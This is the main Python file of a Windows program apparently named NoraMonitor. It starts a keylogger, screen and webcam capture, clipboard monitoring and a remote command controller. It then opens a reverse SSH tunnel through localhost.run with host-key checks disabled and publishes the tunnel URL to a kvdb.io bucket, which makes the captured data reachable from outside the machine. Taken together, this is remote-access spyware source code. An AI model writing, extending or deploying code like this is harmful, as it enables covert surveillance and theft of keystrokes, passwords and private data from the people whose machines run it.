import os
import re
import json
import socket
import subprocess
import threading
import urllib.request
import urllib.parse

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb

PORT = int(os.environ.get("NORA_PORT", 9090))

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
_CONFIG_FILE    = os.path.join(_APP_DIR, "config.json")

KVDB_BASE = "https://kvdb.io"


def _load_config():
    try:
        with open(_CONFIG_FILE) as f:
            return json.load(f)
    except Exception:
        return {}


def _save_config(cfg):
    try:
        with open(_CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


def _ensure_bucket():
    req = urllib.request.Request(KVDB_BASE, data=b"", method="POST")
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode().strip()


def _post_url(bucket_id, pc_name, tunnel_url):
    key = urllib.parse.quote(pc_name, safe="")
    req = urllib.request.Request(
        f"{KVDB_BASE}/{bucket_id}/{key}",
        data=tunnel_url.encode(),
        method="POST"
    )
    urllib.request.urlopen(req, timeout=10)


def _start_tunnel(port):
    def _run():
        try:
            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ServerAliveInterval=30",
                "-R", f"80:localhost:{port}",
                "nokey@localhost.run"
            ]
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            for line in proc.stdout:
                m = re.search(r'https?://\S+\.localhost\.run', line)
                if m:
                    tunnel_url = m.group(0)
                    import time; time.sleep(2)
                    server.broadcast_ngrok_url(tunnel_url)

                    # Auto PC name from hostname
                    cfg = _load_config()
                    pc_name = cfg.get("pc_name") or socket.gethostname()
                    cfg["pc_name"] = pc_name

                    # Auto-create bucket if needed
                    bucket_id = cfg.get("bucket_id", "")
                    if not bucket_id:
                        try:
                            bucket_id = _ensure_bucket()
                            cfg["bucket_id"] = bucket_id
                        except Exception:
                            _save_config(cfg)
                            break

                    _save_config(cfg)

                    # Broadcast bucket ID to viewer so user can copy it
                    server.broadcast_bucket_id(bucket_id)

                    try:
                        _post_url(bucket_id, pc_name, tunnel_url)
                    except Exception:
                        pass
                    break
            proc.wait()
        except Exception:
            pass
    threading.Thread(target=_run, daemon=True).start()


def main():
    os.makedirs(_APP_DIR, exist_ok=True)
    os.makedirs(_RECORDINGS_DIR, exist_ok=True)

    recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
    camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)

    server.init(controller.handle_command, recorder, camera)

    kl.Keylogger(server.broadcast_key).start()

    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
    capture.attach_recorder(recorder)
    capture.start()

    cb.ClipboardMonitor(server.broadcast_clipboard).start()

    threading.Thread(target=_start_tunnel, args=(PORT,), daemon=True).start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
